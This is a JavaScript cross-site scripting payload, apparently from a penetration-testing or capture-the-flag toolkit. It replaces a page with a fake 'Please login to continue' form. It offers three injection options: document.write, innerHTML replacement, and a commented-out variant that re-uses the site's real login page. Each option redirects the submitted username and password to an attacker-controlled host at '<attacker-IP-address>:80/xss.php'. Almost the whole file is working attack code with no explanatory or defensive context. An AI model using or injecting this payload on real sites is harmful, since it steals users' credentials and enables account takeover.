// server
let ip = "<attacker-IP-address>"
let port = "80"

// phishing
let phishing = '<h2>Please login to continue:</h2><form action="http://' + ip + ':' + port + '/xss.php" method="GET"><input type="hidden" name="type" value="phishing"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>'

// option 1
document.write(phishing)

// option 2
//document.getElementsByTagName("html")[0].innerHTML=phishing

// option 3
/*
fetch("login").then(res => res.text().then(data => {
    document.getElementsByTagName("html")[0].innerHTML = data

    let formLogin = document.getElementsByTagName("form")[0]
    formLogin.action = "http://" + ip + ":" + port + "/xss.php"
    formLogin.method = "get"

    let inputHidden = document.createElement("input")
    inputHidden.type = "hidden"
    inputHidden.name = "type"
    inputHidden.value = "phishing"
    formLogin.append(inputHidden)
}))
*/